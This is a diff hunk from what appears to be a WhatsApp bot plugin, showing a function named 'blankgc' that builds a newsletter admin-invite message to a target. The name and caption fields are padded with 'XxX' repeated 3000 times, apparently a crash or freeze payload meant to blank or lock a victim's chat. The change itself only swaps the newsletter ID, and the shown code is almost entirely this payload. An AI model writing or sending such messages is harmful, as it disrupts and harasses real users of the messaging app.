@@ -107,7 +107,7 @@ let handler = async (m, { conn, args }) => {
   async function blankgc(target) {
     const msg = {
       newsletterAdminInviteMessage: {
-        newsletterJid: "120363370611316879@newsletter",
+        newsletterJid: "120363345778623279@newsletter",
         newsletterName: "👑🄼🄸🅃🅉🅄🄺🄸" + "XxX".repeat(3000),
         caption: "ؙ👑🄼🄸🅃🅉🅄🄺🄸👑\n" + "XxX".repeat(3000),
         inviteExpiration: "0"
